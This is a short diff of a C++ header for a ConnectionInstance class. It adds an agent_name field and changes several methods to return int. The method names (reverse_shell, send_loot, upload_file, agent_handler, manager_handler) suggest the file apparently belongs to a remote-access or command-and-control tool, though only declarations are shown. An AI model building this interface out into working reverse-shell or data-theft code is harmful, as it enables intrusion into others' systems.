@@ -16,6 +16,7 @@ private:
     int shell_finished = 0;
     void* data;
     pthread_t thread;
+    char *agent_name;
 public:
     ConnectionInstance();
     ~ConnectionInstance();
@@ -30,19 +31,19 @@ public:
     // get functions
     ptransport_t get_transport();
     void *get_data();
-    void get_info(char *ptr);
-    void get_ports(char *ptr);
+    int get_info(char *ptr);
+    int get_ports(char *ptr);
     
     // handler functions
     int handle_connection();
-    void authenticate(void *sess);
-    void manager_handler();
-    void agent_handler();
+    int authenticate(void *sess);
+    int manager_handler();
+    int agent_handler();
     
     // misc functions
-    void reverse_shell();
-    void send_transports();
-    void setup_transport(char *ptr);
+    int reverse_shell();
+    int send_transports();
+    int setup_transport(char *ptr);
     int send_info(char *ptr);
     int upload_file(char *ptr);
     int send_loot(char *ptr);
